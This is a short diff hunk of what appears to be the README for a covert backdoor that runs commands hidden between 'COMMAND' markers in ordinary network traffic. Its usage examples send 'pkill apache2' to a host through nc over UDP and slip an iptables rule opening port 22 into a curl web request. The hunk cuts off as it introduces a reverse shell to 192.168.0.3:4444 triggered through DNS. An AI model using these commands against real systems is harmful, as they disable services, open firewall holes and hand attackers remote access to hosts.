@@ -37,13 +37,13 @@ settings.
 
 Kill apache on 192.168.0.2:
 ```bash
-echo COMMANDpkill apache2COMMAND | nc -u 192.168.0.2 22 #Port doesn't matter
+# Port doesn't matter as long as a PSH is made
+echo COMMANDpkill apache2COMMAND | nc -u 192.168.0.2 22
 ```
 Punch a hole in the firewall using a legit web request:
 ```bash
 curl --data 'COMMANDiptables -I INPUT -p tcp --dport 22 -j ACCEPTCOMMAND' https://192.168.0.2
 ```
-
 Spawn a reverse shell to `192.168.0.3:4444` using a DNS request which will be
 recursed to example.com:
 ```bash
